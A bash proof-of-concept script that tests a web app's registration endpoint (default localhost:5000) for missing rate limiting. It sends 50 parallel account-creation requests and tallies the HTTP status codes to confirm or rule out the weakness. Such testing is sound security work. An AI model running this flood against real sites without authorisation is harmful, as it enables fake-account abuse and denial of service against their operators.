#!/bin/bash

# POC: No Rate Limiting on Registration Endpoint
# Description: Attempts 50 simultaneous registrations to demonstrate DoS vulnerability
# Expected: All requests should return HTTP 302 (or potentially 429 if rate limiting is in place)
# Actual: All requests return HTTP 302, confirming no rate limiting

TARGET_URL="${1:-http://localhost:5000/register}"
NUM_REQUESTS="${2:-50}"
RESULTS_FILE="/tmp/registration_results_$$.txt"

echo "[*] Testing rate limiting on registration endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Number of simultaneous requests: $NUM_REQUESTS"
echo ""

# Clear results file
> "$RESULTS_FILE"

# Function to perform registration attempt
perform_registration() {
    local attempt=$1
    local username="ratelimit_test_$RANDOM"
    local email="test_$RANDOM@example.com"
    
    # Make request and capture HTTP response code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET_URL" \
        -d "username=$username&password=test123&first_name=Test&last_name=User&email=$email" \
        2>/dev/null)
    
    echo "$http_code" >> "$RESULTS_FILE"
    echo "Request $attempt: HTTP $http_code"
}

# Execute all requests in parallel
echo "[*] Sending $NUM_REQUESTS simultaneous registration requests..."
for i in $(seq 1 $NUM_REQUESTS); do
    perform_registration "$i" &
done

# Wait for all background jobs to complete
wait

echo ""
echo "[*] Analysis of responses:"

# Count response codes using awk to avoid newline issues
http_302_count=$(awk '$1 == "302" {count++} END {print count+0}' "$RESULTS_FILE")
http_429_count=$(awk '$1 == "429" {count++} END {print count+0}' "$RESULTS_FILE")
http_200_count=$(awk '$1 == "200" {count++} END {print count+0}' "$RESULTS_FILE")
http_other_count=$((NUM_REQUESTS - http_302_count - http_429_count - http_200_count))

echo "  - HTTP 302 (Success/Redirect): $http_302_count"
echo "  - HTTP 200 (Success): $http_200_count"
echo "  - HTTP 429 (Rate Limited): $http_429_count"
echo "  - Other responses: $http_other_count"
echo ""

# Verdict
successful_count=$((http_302_count + http_200_count))
if [ "$http_429_count" -eq 0 ] && [ "$successful_count" -ge $((NUM_REQUESTS - 2)) ]; then
    echo "[!] VULNERABILITY CONFIRMED: All $successful_count out of $NUM_REQUESTS requests succeeded"
    echo "[!] No rate limiting detected on registration endpoint"
    echo "[!] DoS vulnerability via account creation abuse is possible"
    rm -f "$RESULTS_FILE"
    exit 0
elif [ "$http_429_count" -gt 0 ]; then
    echo "[+] Rate limiting detected: $http_429_count requests were throttled"
    echo "[+] Endpoint is protected against DoS attacks"
    rm -f "$RESULTS_FILE"
    exit 1
else
    echo "[?] Unexpected response pattern detected"
    cat "$RESULTS_FILE"
    rm -f "$RESULTS_FILE"
    exit 2
fi